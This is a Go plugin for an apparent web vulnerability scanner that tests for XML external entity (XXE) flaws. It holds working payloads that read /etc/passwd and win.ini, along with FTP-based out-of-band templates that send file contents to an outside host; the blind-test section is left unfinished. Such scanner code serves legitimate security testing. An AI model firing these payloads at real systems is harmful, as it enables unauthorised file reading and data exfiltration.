package xxe

import (
	"encoding/json"
	"glint/fastreq"
	"glint/logger"
	"glint/plugin"
	"glint/util"
	"regexp"
	"strings"
	"time"

	"github.com/thoas/go-funk"
)

var DefaultProxy = ""
var Cert string
var Mkey string

var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`

//bind-xxe
var reverse_template = []string{
	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
	`<!DOCTYPE uuu SYSTEM "%s">`,
}

func Xxe(args interface{}) (*util.ScanResult, error) {
	var err error
	// var blastIters interface{}
	util.Setup()
	group := args.(plugin.GroupData)
	// ORIGIN_URL := `http://not-a-valid-origin.xsrfprobe-csrftesting.0xinfection.xyz`
	ctx := *group.Pctx

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	default:
	}

	session := group.GroupUrls.(map[string]interface{})
	url := session["url"].(string)
	method := session["method"].(string)
	headers, _ := util.ConvertHeaders(session["headers"].(map[string]interface{}))
	body := []byte(session["data"].(string))
	Cert = group.HttpsCert
	Mkey = group.HttpsCertKey
	sess := fastreq.GetSessionByOptions(
		&fastreq.ReqOptions{
			Timeout:       2 * time.Second,
			AllowRedirect: true,
			Proxy:         DefaultProxy,
			Cert:          Cert,
			PrivateKey:    Mkey,
		})

	var ContentType string = "None"
	if value, ok := headers["Content-Type"]; ok {
		ContentType = value
	}

	var hostid int64
	if value, ok := session["hostid"].(int64); ok {
		hostid = value
	}

	if value, ok := session["hostid"].(json.Number); ok {
		hostid, _ = value.Int64()
	}

	var xmlversion bool
	reg := `^\s*<\?xml`
	match, _ := regexp.MatchString(reg, string(body))
	if match {
		xmlversion = true
	}
	xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
	payloads := []string{
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
	}

	win_pl := []string{
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///c:/windows/win.ini">]>`,
	}

	//"application/xml;charset=UTF-8"
	if funk.Contains(ContentType, "text/xml") {
		for _, pl := range payloads {
			if strings.ToUpper(method) == "POST" {
				req1, resp1, errs := sess.Post(url, headers, []byte(pl))
				if errs != nil {
					return nil, errs
				}
				body := string(resp1.Body())
				if funk.Contains(body, "root:[x*]:0:0:") {
					Result := util.VulnerableTcpOrUdpResult(url,
						"xxe Vulnerable",
						[]string{string(req1.String())},
						[]string{string(body)},
						"high",
						hostid)
					return Result, errs
				}
			}
		}

		//bind-xxe

		//无回显显示器
		// bind_payloads := []string{
		// 	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>`,
		// 	`<!DOCTYPE foo SYSTEM "{}">`,
		// }

		// for _, pl := range bind_payloads {
		// 	if xmlversion {
		// 		pl_ := xmlversion_text + "\r\n" + pl
		// 	}
		// 	info := "xxe_" + self.parser.getfilepath()
		// }

	}

	//<?xml version="1.0" encoding="utf-8"?>

	if funk.Contains(ContentType, "application/xml") {

		var pl_ string
		if !xmlversion {
			pl_ = xmlversion_text
			logger.Debug(pl_)
		}
		// err := xml.Unmarshal([]byte(pl_), &blastIters)
		// if err != nil {
		// 	logger.Error("%v", err.Error())
		// }

		for _, pl := range win_pl {
			if strings.ToUpper(method) == "POST" {
				doc, err := util.ParseXMl(body)
				if err != nil {
					logger.Error("%v", err.Error())
				}
				newbody, err := doc.WriteToBytes()
				if err != nil {
					logger.Error("%v", err.Error())
				}

				newbody = []byte(strings.ReplaceAll(string(newbody), "&amp;content", "&content;"))
				npl := append([]byte(pl), newbody...)
				if strings.ToUpper(method) == "POST" {
					req1, resp1, errs := sess.Post(url, headers, []byte(npl))
					if errs != nil {
						return nil, errs
					}
					body := string(resp1.Body())
					if funk.Contains(body, "for 16-bit app") {
						Result := util.VulnerableTcpOrUdpResult(url,
							"xxe Vulnerable",
							[]string{string(req1.String())},
							[]string{string(body)},
							"high",
							session["hostid"].(int64))
						return Result, errs
					}
				}
			}
		}
	}

	//如果都没有报出漏洞的话，尝试Blind测试
	//首先，开启两个

	return nil, err
}
